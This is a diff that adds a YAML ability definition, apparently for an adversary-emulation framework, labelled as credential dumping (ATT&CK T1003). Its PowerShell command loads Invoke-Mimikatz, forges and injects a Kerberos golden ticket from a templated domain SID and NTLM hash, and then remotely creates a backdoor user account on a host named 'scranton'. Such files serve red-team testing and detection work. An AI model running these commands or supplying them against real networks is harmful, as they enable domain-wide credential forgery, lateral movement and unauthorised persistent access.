@@ -1,0 +1,18 @@
+---
+- id: 267bad86-3f06-49f1-9a3e-6522f2a61e7a
+  name: 20.A.1 - Execute Invoke-Mimikatz 
+  description: Perfofrm Mimikatz credential collection
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          klist purge;
+          . .\Invoke-Mimikatz.ps1;
+          invoke-mimikatz -command "kerberos::golden /domain:#{target.domain.name} /sid:#{target.sid}  /rc4:#{target.ntlm} /user:#{target.winrm.username} /ptt";
+          klist;
+          invoke-command -ComputerName scranton -ScriptBlock {net user /add toby "pamBeesly<3"};
+        payload: Invoke-Mimikatz.ps1
